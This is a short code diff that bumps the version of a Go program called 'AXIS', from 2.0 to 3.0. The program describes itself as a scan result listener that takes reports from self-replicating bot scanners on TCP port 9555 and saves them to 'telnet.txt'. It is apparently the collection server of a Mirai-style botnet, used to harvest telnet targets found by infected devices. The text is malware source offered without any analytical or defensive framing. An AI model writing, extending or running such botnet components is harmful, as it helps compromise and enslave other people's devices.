@@ -1,4 +1,4 @@
-// AXIS 2.0 - Scan Result Listener
+// AXIS 3.0 - Scan Result Listener
 // ============================================================================
 // Receives scan results from bot self-replication scanners
 // Listens on TCP port 9555 for incoming reports
@@ -22,7 +22,7 @@ const scanListenAddr string = "0.0.0.0:9555"
 const outputFile string = "telnet.txt"
 
 func main() {
-	fmt.Printf("AXIS 2.0 scanListen starting on %s\n", scanListenAddr)
+	fmt.Printf("AXIS 3.0 scanListen starting on %s\n", scanListenAddr)
 	fmt.Printf("Output file: %s\n", outputFile)
 
 	l, err := net.Listen("tcp", scanListenAddr)
